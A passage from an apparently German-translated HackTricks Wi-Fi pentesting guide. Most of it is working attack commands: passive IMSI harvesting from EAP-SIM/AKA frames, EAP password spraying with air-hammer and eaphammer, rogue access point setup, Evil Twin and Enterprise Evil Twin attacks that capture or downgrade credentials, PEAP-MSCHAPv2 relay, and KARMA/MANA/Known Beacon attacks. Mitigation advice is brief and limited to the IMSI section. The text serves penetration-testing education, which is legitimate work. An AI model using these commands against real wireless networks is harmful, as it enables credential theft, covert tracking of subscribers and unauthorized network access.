- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Zum Erweitern klicken</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Hinweise:
- Funktioniert vor jedem TLS‑Tunnel, wenn die Deployment bare EAP‑SIM/AKA ohne geschützte Identität/Pseudonyme verwendet.
- Der exponierte Wert ist ein permanenter Bezeichner, der an die SIM des Teilnehmers gebunden ist; das Sammeln ermöglicht langfristiges Tracking und nachgelagerte Telecom‑Missbräuche.

Auswirkungen
- Privacy: persistentes Nutzer-/Gerätetracking durch passive Wi‑Fi‑Erfassungen an öffentlichen Orten.
- Telecom‑Missbrauchs-Basis: Mit der IMSI kann ein Angreifer mit SS7/Diameter‑Zugriff den Standort abfragen oder versuchen, Anrufe/SMS abzufangen und MFA zu stehlen.

Gegenmaßnahmen / worauf zu achten ist
- Stellen Sie sicher, dass Clients anonyme äußere Identitäten (Pseudonyme) für EAP‑SIM/AKA verwenden, wie in den 3GPP‑Richtlinien (z. B. 3GPP TS 33.402) beschrieben.
- Bevorzugen Sie das Tunneln der Identitätsphase (z. B. EAP‑TTLS/PEAP mit innerem EAP‑SIM/AKA), sodass die IMSI niemals im Klartext gesendet wird.
- Packet‑Captures der Association/Auth sollten niemals eine rohe IMSI in EAP‑Response/Identity offenbaren.

Siehe auch: Telecom signalling exploitation with captured mobile identifiers
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

Wenn erwartet wird, dass der Client ein **username and password** verwendet (beachte, dass **EAP-TLS** in diesem Fall nicht gültig ist), kannst du versuchen, eine **Liste** von **usernames** (siehe nächsten Abschnitt) und **passwords** zu beschaffen und den Zugang mittels **bruteforce** unter Verwendung von [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer) zu erzwingen.
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Diesen Angriff können Sie auch mit `eaphammer` durchführen:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Client-Angriffe — Theorie

### Netzauswahl und Roaming

- Das 802.11-Protokoll definiert, wie eine Station einem Extended Service Set (ESS) beitritt, legt jedoch nicht die Kriterien für die Auswahl eines ESS oder eines Access Points (AP) innerhalb desselben fest.
- Stationen können zwischen APs mit derselben ESSID roamen und so die Konnektivität über ein Gebäude oder Gebiet hinweg aufrechterhalten.
- Das Protokoll verlangt die Authentifizierung der Station gegenüber dem ESS, verlangt jedoch nicht die Authentifizierung des AP gegenüber der Station.

### Preferred Network Lists (PNLs)

- Stationen speichern die ESSID jedes drahtlosen Netzwerks, mit dem sie sich verbinden, in ihrer Preferred Network List (PNL) zusammen mit netzwerkspezifischen Konfigurationsdetails.
- Die PNL wird verwendet, um automatisch Verbindungen zu bekannten Netzwerken herzustellen und verbessert so die Benutzererfahrung, indem der Verbindungsprozess vereinfacht wird.

### Passives Scannen

- APs senden periodisch Beacon-Frames, die ihre Präsenz und Eigenschaften ankündigen, einschließlich der ESSID des AP, sofern das Broadcasting nicht deaktiviert ist.
- Während des passiven Scannings hören Stationen auf Beacon-Frames. Stimmen die ESSID eines Beacon mit einem Eintrag in der PNL der Station überein, kann sich die Station automatisch mit diesem AP verbinden.
- Kenntnisse über die PNL eines Geräts ermöglichen potenzielle Ausnutzung, indem man die ESSID eines bekannten Netzwerks imitiert und das Gerät dazu verleitet, sich mit einem rogue AP zu verbinden.

### Aktives Probing

- Aktives Probing beinhaltet, dass Stationen Probe-Requests senden, um nahegelegene APs und deren Eigenschaften zu entdecken.
- Direktierte Probe-Requests richten sich an eine bestimmte ESSID und helfen festzustellen, ob ein bestimmtes Netzwerk in Reichweite ist, selbst wenn es sich um ein verstecktes Netzwerk handelt.
- Broadcast-Probe-Requests haben ein null SSID-Feld und werden an alle nahegelegenen APs gesendet, wodurch die Station nach beliebigen bevorzugten Netzwerken suchen kann, ohne den Inhalt ihrer PNL preiszugeben.

## Einfacher AP mit Weiterleitung ins Internet

Bevor erklärt wird, wie man komplexere Angriffe durchführt, wird erklärt, **wie** man einfach nur einen **AP** erstellt und dessen **Traffic** auf ein Interface weiterleitet, das mit dem **Internet** verbunden ist.

Mit `ifconfig -a` prüfen, dass das wlan-Interface zum Erstellen des AP und das Interface, das mit dem Internet verbunden ist, vorhanden sind.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Erstelle die Konfigurationsdatei `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Dann **set IPs** und **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Und dann **starte** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Erstelle eine Konfigurationsdatei `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Stoppe störende Prozesse**, setze **monitor mode**, und **starte hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Weiterleitung und Umleitung
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Ein Evil Twin attack nutzt aus, wie WiFi clients Netzwerke erkennen, wobei sie sich hauptsächlich auf den Netzwerknamen (ESSID) verlassen, ohne dass die base station (access point) sich gegenüber dem client authentifizieren muss. Wichtige Punkte sind:

- **Schwierigkeiten bei der Unterscheidung**: Geräte haben Schwierigkeiten, legitime und rogue access points zu unterscheiden, wenn sie dieselbe ESSID und denselben Verschlüsselungstyp verwenden. In der Praxis verwenden Netzwerke oft mehrere access points mit derselben ESSID, um die Abdeckung nahtlos zu erweitern.
- **Client-Roaming und Verbindungsmanipulation**: Das 802.11-Protokoll erlaubt Geräten, zwischen access points innerhalb desselben ESS zu roamen. Angreifer können dies ausnutzen, indem sie ein Gerät dazu verleiten, die Verbindung zur aktuellen base station zu trennen und sich mit einem rogue access point zu verbinden. Das kann erreicht werden, indem man ein stärkeres Signal anbietet oder die Verbindung zum legitimen access point durch Methoden wie deauthentication packets oder jamming stört.
- **Schwierigkeiten bei der Durchführung**: Einen Evil Twin attack erfolgreich in Umgebungen mit mehreren, gut platzierten access points durchzuführen, kann herausfordernd sein. Das Deauthenticating eines einzelnen legitimen access points führt häufig dazu, dass das Gerät sich mit einem anderen legitimen access point verbindet, es sei denn, der Angreifer kann alle nahegelegenen access points deauthenticaten oder den rogue access point strategisch platzieren.

Du kannst einen sehr einfachen Open Evil Twin erstellen (keine Möglichkeit, Traffic ins Internet zu routen), indem du:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Sie können auch einen Evil Twin mit **eaphammer** erstellen (beachten Sie, dass die Schnittstelle zum Erstellen von Evil Twins mit eaphammer **NICHT** im **monitor**-Modus sein sollte):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Oder mit Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

Bitte beachte, dass standardmäßig, wenn eine ESSID im PNL als WPA geschützt gespeichert ist, sich das Gerät nicht automatisch mit einem Open evil Twin verbindet. Du kannst versuchen, den realen AP zu DoS'en und hoffen, dass sich der Benutzer manuell mit deinem Open evil Twin verbindet, oder du könntest den realen AP DoS'en und einen WPA Evil Twin verwenden, um den handshake zu capture'n (bei dieser Methode wirst du das Opfer nicht mit dir verbinden lassen können, da du den PSK nicht kennst, aber du kannst den handshake erfassen und versuchen, ihn zu cracken).

_Einige OS und AV werden den Benutzer davor warnen, dass die Verbindung zu einem Open-Netzwerk gefährlich ist..._

### WPA/WPA2 Evil Twin

Du kannst einen **Evil Twin using WPA/2** erstellen und wenn die Geräte so konfiguriert sind, sich mit dieser SSID über WPA/2 zu verbinden, werden sie versuchen, sich zu verbinden. Um jedoch den **4-way-handshake** abzuschließen, musst du außerdem das **Passwort** kennen, das der Client verwenden wird. Wenn du **es nicht kennst**, wird die **Verbindung nicht abgeschlossen**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Um diese Angriffe zu verstehen, empfehle ich, zuvor die kurze [WPA Enterprise explanation](#wpa-enterprise-mgt) zu lesen.

**hostapd-wpe verwenden**

`hostapd-wpe` benötigt eine **Konfigurationsdatei**, um zu funktionieren. Um die Erstellung dieser Konfigurationen zu **automatisieren**, kannst du [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) verwenden (lade die python-Datei innerhalb von _/etc/hostapd-wpe/_ herunter)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
In der Konfigurationsdatei kannst du viele verschiedene Dinge auswählen wie ssid, channel, user files, cret/key, dh parameters, wpa version und auth...

[**Using hostapd-wpe with EAP-TLS to allow any certificate to login.**](evil-twin-eap-tls.md)

**Using EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Standardmäßig verwendet EAPHammer die folgenden authentication methods (beachte GTC als erste, um plaintext passwords zu erhalten, gefolgt von der Verwendung robusterer auth methods):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Dies ist die Standardmethode, um lange Verbindungszeiten zu vermeiden. Sie können dem server jedoch auch die authentication methods von schwächsten bis stärksten angeben:
```
--negotiate weakest
```
Oder du könntest auch verwenden:

- `--negotiate gtc-downgrade` um eine hocheffiziente GTC-Downgrade-Implementierung zu verwenden (Klartext-Passwörter)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` um die angebotenen Methoden manuell anzugeben (wenn die gleichen Auth-Methoden in derselben Reihenfolge wie die Organisation angeboten werden, wird die Erkennung des Angriffs deutlich schwieriger).
- [Weitere Infos im Wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

#### Wenn Clients die RADIUS-Zertifikatvalidierung überspringen (PEAP/TTLS)

- Wenn Geräte mit "do not validate certificate" konfiguriert sind, sammelt ein geklonter AP + rogue RADIUS (`eaphammer --cert-wizard --creds --auth wpa-eap`) **NetNTLMv2** (PEAP-MSCHAPv2) oder **cleartext** creds (PEAP-GTC). `bettercap` deauth (`wifi.deauth <BSSID>`) zeigt während Probe-Anfragen versteckte SSIDs und erzwingt Reconnects, es sei denn PMF/802.11w blockiert gefälschte deauth.
- Geknacktes NetNTLMv2 liefert wiederverwendbare Wi‑Fi/AD creds; GTC liefert sofort Klartext.

#### Relaying PEAP-MSCHAPv2 instead of cracking (wpa_sycophant + hostapd-mana)

- Bei Maschinenkonten mit unknackbaren zufälligen Passwörtern missbrauche **MSCHAPv2 relay**: Starte `hostapd-mana` als Evil Twin und leite den MSCHAPv2-Austausch an `wpa_sycophant` weiter, das gleichzeitig eine Verbindung zum legitimen AP herstellt. Ein erfolgreicher Relay gewährt authentifiziertes Wi‑Fi, ohne das Passwort wiederherzustellen.
- Verwende Builds, die das Ziel-Sicherheitsniveau unterstützen (WPA3/PMF erfordert aktuelle hostapd/wpa_supplicant); PMF verhindert deauth-Erzwingung, daher auf freiwillige Client-Associations warten.

**Using Airgeddon**

`Airgeddon` kann zuvor erzeugte Zertifikate verwenden, um EAP-Authentifizierung für WPA/WPA2-Enterprise-Netzwerke anzubieten. Das gefälschte Netzwerk wird das Verbindungsprotokoll auf EAP-MD5 downgraden, sodass es möglich ist, **den Benutzer und den MD5 des Passworts** zu erfassen. Später kann der Angreifer versuchen, das Passwort zu cracken.\
`Airggedon` bietet die Möglichkeit eines **kontinuierlichen Evil Twin attack (noisy)** oder **nur das Evil Attack zu erstellen, bis sich jemand verbindet (smooth).**

![](<../../images/image (936).png>)

### Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks

_Diese Methode wurde bei einer PEAP-Verbindung getestet, da ich jedoch einen beliebigen TLS-Tunnel dekryptiere, sollte dies auch mit EAP-TTLS funktionieren_

Kommentiere in der **Konfiguration** von _hostapd-wpe_ die Zeile aus, die _**dh_file**_ enthält (von `dh_file=/etc/hostapd-wpe/certs/dh` zu `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Dadurch wird `hostapd-wpe` **Schlüssel mit RSA austauschen** statt DH, sodass du den Traffic später **entschlüsseln** kannst, wenn du den privaten Schlüssel des Servers kennst.

Starte nun den **Evil Twin** wie gewohnt mit **`hostapd-wpe`** und der modifizierten Konfiguration. Starte außerdem **`wireshark`** auf der **Schnittstelle**, die den Evil Twin-Angriff ausführt.

Jetzt oder später (wenn du bereits einige Authentifizierungsversuche erfasst hast) kannst du den privaten RSA-Schlüssel zu wireshark hinzufügen unter: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Füge einen neuen Eintrag hinzu und fülle das Formular mit diesen Werten: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**wähle deine Key-Datei aus**, um Probleme zu vermeiden, wähle eine Key-Datei **ohne Passwortschutz**).

![](<../../images/image (687).png>)

Und sieh dir den neuen **"Decrypted TLS" tab** an:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons attack

### ESSID- und MAC-Black/Whitelists

Verschiedene Typen von Media Access Control Filter Lists (MFACLs) und deren Modi sowie Auswirkungen auf das Verhalten eines rogue Access Point (AP):

1. **MAC-based Whitelist**:
- Der rogue AP antwortet nur auf Probe-Anfragen von Geräten, die in der Whitelist angegeben sind, und bleibt für alle nicht gelisteten Geräte unsichtbar.
2. **MAC-based Blacklist**:
- Der rogue AP ignoriert Probe-Anfragen von Geräten auf der Blacklist und macht sich dadurch für diese Geräte effektiv unsichtbar.
3. **SSID-based Whitelist**:
- Der rogue AP antwortet nur auf Probe-Anfragen für spezifische aufgelistete ESSIDs, wodurch er für Geräte unsichtbar wird, deren Preferred Network Lists (PNLs) diese ESSIDs nicht enthalten.
4. **SSID-based Blacklist**:
- Der rogue AP antwortet nicht auf Probe-Anfragen für die spezifischen ESSIDs auf der Blacklist, wodurch er für Geräte unsichtbar wird, die diese Netzwerke suchen.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Diese Methode erlaubt einem Angreifer, einen bösartigen access point (AP) zu erstellen, der auf alle probe requests von Geräten reagiert, die versuchen, sich mit Netzwerken zu verbinden. Diese Technik **täuscht Geräte dazu, sich mit dem AP des Angreifers zu verbinden**, indem sie die Netzwerke imitiert, nach denen die Geräte suchen. Sobald ein Gerät eine Verbindungsanfrage an diesen rogue AP sendet, wird die Verbindung abgeschlossen, wodurch das Gerät fälschlicherweise mit dem Netzwerk des Angreifers verbunden wird.

### MANA

Dann **begannen Geräte, unzuverlässige Netzwerkantworten zu ignorieren**, wodurch die Wirksamkeit des ursprünglichen karma attack abnahm. Allerdings wurde eine neue Methode, bekannt als die **MANA attack**, von Ian de Villiers und Dominic White eingeführt. Diese Methode beinhaltet, dass der rogue AP **Preferred Network Lists (PNL) von Geräten erfasst, indem er auf deren broadcast probe requests mit Netzwerknamen (SSIDs) antwortet**, die zuvor den Geräten bekannt waren. Dieser ausgeklügelte Angriff umgeht die Schutzmechanismen gegen den ursprünglichen karma attack, indem er ausnutzt, wie Geräte bekannte Netzwerke speichern und priorisieren.

Der MANA attack funktioniert, indem er sowohl directed als auch broadcast probe requests von Geräten überwacht. Bei directed requests zeichnet er die MAC address des Geräts und den angeforderten Netzwerknamen auf und fügt diese Informationen einer Liste hinzu. Wenn eine broadcast request empfangen wird, antwortet der AP mit Informationen, die mit einem der Netzwerke auf der Liste des Geräts übereinstimmen, und verleitet das Gerät dazu, sich mit dem rogue AP zu verbinden.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

Eine **Loud MANA attack** ist eine fortgeschrittene Strategie für Situationen, in denen Geräte kein directed probing verwenden oder ihre Preferred Network Lists (PNL) dem Angreifer nicht bekannt sind. Sie basiert auf dem Prinzip, dass **Geräte im selben Bereich wahrscheinlich einige Netzwerknamen in ihren PNLs teilen**. Anstatt selektiv zu antworten, sendet dieser Angriff probe responses für jeden Netzwerknamen (ESSID), der in den kombinierten PNLs aller beobachteten Geräte gefunden wird. Dieser breit angelegte Ansatz erhöht die Wahrscheinlichkeit, dass ein Gerät ein vertrautes Netzwerk erkennt und versucht, eine Verbindung zum rogue Access Point (AP) herzustellen.
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Wenn die **Loud MANA attack** nicht ausreicht, bietet die **Known Beacon attack** einen anderen Ansatz. Diese Methode **brute-forces den Verbindungsprozess, indem sie einen AP simuliert, der auf jeden Netzwerknamen reagiert und eine Liste potenzieller ESSIDs** aus einer wordlist durchläuft. Das simuliert die Präsenz zahlreicher Netzwerke in der Hoffnung, eine ESSID aus dem PNL des Opfers zu treffen, wodurch ein Verbindungsversuch zu dem gefälschten AP ausgelöst wird. Der Angriff kann verstärkt werden, indem man ihn mit der `--loud` Option kombiniert, für einen aggressiveren Versuch, Geräte einzufangen.

Eaphammer implementierte diesen Angriff als eine MANA attack, bei der alle ESSIDs in einer Liste ausgesendet werden (du könntest dies auch mit `--loud` kombinieren, um einen Loud MANA + Known beacons attack zu erstellen):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

Die **Known Beacon Burst attack** beinhaltet die **schnelle Übertragung von beacon frames für jede in einer Datei aufgeführte ESSID**. Das erzeugt eine dichte Umgebung aus fake networks und erhöht stark die Wahrscheinlichkeit, dass Geräte sich mit dem rogue AP verbinden, besonders in Kombination mit einer MANA attack. Diese Technik nutzt Geschwindigkeit und Volumen, um die Mechanismen zur Netzwerkauswahl der Geräte zu überlasten.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** ist ein Protokoll, das Geräten ermöglicht, sich direkt über Wi‑Fi miteinander zu verbinden, ohne einen traditionellen wireless access point zu benötigen. Diese Fähigkeit ist in verschiedenen Internet of Things (IoT)-Geräten integriert, wie Druckern und Fernsehern, und ermöglicht direkte Gerät-zu-Gerät-Kommunikation. Ein bemerkenswertes Merkmal von Wi‑Fi Direct ist, dass ein Gerät die Rolle eines access point übernimmt, bekannt als group owner, um die Verbindung zu verwalten.

Die Sicherheit von Wi‑Fi Direct-Verbindungen wird über **Wi-Fi Protected Setup (WPS)** hergestellt, das mehrere Methoden für sicheres Pairing unterstützt, darunter:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Diese Methoden, insbesondere die PIN entry, sind denselben Schwachstellen ausgesetzt wie WPS in traditionellen Wi‑Fi-Netzwerken und damit Ziel ähnlicher Angriffsvektoren.

### EvilDirect Hijacking

**EvilDirect Hijacking** ist ein Angriff, der speziell auf Wi‑Fi Direct abzielt. Er spiegelt das Konzept eines Evil Twin-Angriffs wider, richtet sich jedoch gegen Wi‑Fi Direct-Verbindungen. In diesem Szenario gibt sich ein Angreifer als legitimer group owner aus, mit dem Ziel, Geräte dazu zu bringen, sich mit einer bösartigen Entität zu verbinden. Diese Methode kann mit Tools wie `airbase-ng` ausgeführt werden, indem der channel, ESSID und die MAC address des imitierenden Geräts angegeben werden:

## Referenzen

- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)
- [Wireless-(in)Fidelity: Pentesting Wi-Fi in 2025 (Synacktiv)](https://www.synacktiv.com/en/publications/wireless-infidelity-pentesting-wi-fi-in-2025.html)
- [PEAP relay attacks with wpa_sycophant (SensePost)](https://sensepost.com/blog/2019/peap-relay-attacks-with-wpa_sycophant/)


TODO: Schau dir [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) an (Facebook-Login und Nachahmung von WPA in Captive Portals)

{{#include ../../banners/hacktricks-training.md}}
